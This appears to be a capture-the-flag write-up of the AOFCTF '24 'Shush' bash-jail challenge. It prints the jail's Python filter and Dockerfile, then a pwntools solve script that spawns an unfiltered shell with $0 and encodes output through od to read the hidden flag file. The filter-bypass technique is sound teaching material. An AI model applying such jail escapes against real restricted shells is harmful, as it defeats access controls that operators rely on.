@@ -1,0 +1,139 @@
+---
+title: AOFCTF '24 - Misc - Shush
+date: '2024-04-29'
+tags: ['misc', 'aofctf', 'bash-jail', 'blind', '$0']
+draft: false
+summary: Using $0 to spawn a shell, then using od to convert output to decimal, then parsing the output.
+---
+
+## Challenge Description
+
+![alt text](/static/writeups/aofctf-24/image-21.png)
+
+## Solution
+
+This was challenge was an amalgam of challs from PicoCTF 2024 and AmateursCTF 2024. However, in this case, the output had a banlist. Meaning that you cannot output characters. Looking at the source code that was provided:
+
+```py:shush
+#!/usr/bin/env python3
+from subprocess import Popen, PIPE, STDOUT
+
+INVALID_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\\"\'`:{}[]()._,<>|'
+MAX_CHARS_ALLOWED = 5
+OUTPUT_BAN = ["CTF", "FLAG", "root", "ctf-player"]
+PROMPT = "sh[ush]$ "
+
+while True:
+    try:
+        __input = input(PROMPT)
+        if any(c in INVALID_CHARS for c in __input):
+            raise Exception('INVALID_CHARS_ERROR: Command contains invalid characters')
+
+        if len(__input) >= MAX_CHARS_ALLOWED:
+            raise Exception(f"LENGTH_ERROR: Command is longer than {MAX_CHARS_ALLOWED} characters")
+
+        p = Popen(["/bin/sh", "-c", __input], stdout=PIPE, stderr=STDOUT)
+        output = p.stdout.read().decode('utf-8')
+
+        if any(c in INVALID_CHARS for c in output):
+            raise Exception('INVALID_CHARS_ERROR: Command output contains invalid characters')
+
+        if any(banned.lower() in output.lower() for banned in OUTPUT_BAN):
+            raise Exception('OUTPUT_ERROR: Command output contains banned characters')
+
+        print(output)
+    except Exception as E:
+        print(E)
+```
+
+I also provided the Dockerfile
+
+```Dockerfile
+FROM theflash2k/pwn-chal:py38
+
+ENV CHAL_NAME=shush
+COPY ${CHAL_NAME} .
+COPY flag.txt /
+
+# Prevent unintended solutions:
+ENV ENV=/etc/profile.d/aliases.sh
+RUN rm -f /usr/local/bin/pip /usr/local/bin/pip3 && \
+    chown root:root /var/tmp /tmp /run/lock /dev/shm /dev/mqueue /home/ctf-player && \
+    chmod 770 /var/tmp /tmp /run/lock /dev/shm /dev/mqueue /home/ctf-player && \
+    echo "alias exec=asdasdasdasd" > /etc/profile.d/aliases.sh && \
+    echo "alias nohup=asdasdasdasd" >>  /etc/profile.d/aliases.sh && \
+    echo "alias alias=asdasdasdasd" >>  /etc/profile.d/aliases.sh && \
+    echo "alias env=asdasdasdasd" >>  /etc/profile.d/aliases.sh && \
+    chmod 444 /etc/profile.d/aliases.sh
+
+RUN mv /flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt
+EXPOSE 8000
+```
+
+We can see that flag was being stored at `/` with a random name and a lot of unintended solutions were blocked (but I believe there still were many).
+
+Let's go over my solution. My solution utilized `$0` to spawn a `/bin/sh` instance. This instance didn't have input filtering, however the output filter would match against: `INVALID_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\\"\':{}[]()._,<>|'`.
+
+What I came up with was utilizing `od` to convert the output to only numbers, and each number would be parseable in my python source. Manually trying this:
+
+```bash
+$ ./shush
+sh[ush]$ $0
+echo "test" | od -An -tu1
+exit
+ 116 101 115 116  10
+```
+
+Now, if we were to decode the output:
+
+![alt text](/static/writeups/aofctf-24/image-22.png)
+
+Perfect, so we know we can get the flag, there are two approches: `cat /flag*` or getting a proper shell.
+
+Since I love spawning shells, I'm going for the latter. My final solve script looked like:
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+io = remote(sys.argv[1], int(sys.argv[2])
+    ) if args.REMOTE else process("./shush")
+
+def decode(data: str):
+    data = list(filter(lambda x: x != "", data.split("-")))
+    return "".join([chr(int(x)) for x in data])
+
+def run(cmd: str):
+    BASE_CMD = "{cmd} | od -An -tu1 | tr ' ' '-'"
+    io.sendlineafter(b"$ ", b"$0")
+    cmd = BASE_CMD.format(cmd=cmd)
+    print(f"Running: {cmd}")
+    io.sendline(cmd.encode())
+    io.sendline(b"exit")
+
+    resp = io.recvuntil(b"sh[ush]")[:-9].decode().split("\n")
+    output = ""
+    for line in resp:
+        line = decode(line)
+        output += line
+
+    io.sendline(b"exit") # so that we get the "sh[ush]" prompt:
+    io.recvline()
+    return output
+
+output = run("ls /").split("\n")
+
+idx = 0
+for i, line in enumerate(output):
+    if line.startswith("flag"):
+        idx = i
+        break
+
+flag = run(f"cat /{output[idx]}")
+print(f"Flag: {flag}")
+
+io.interactive()
+```
+
+Now, what I did, wrapped the entire functionality inside the `run` function, and we can just give it any command, it'll run for us, so even if we did `cat /flag*`, it would still work.
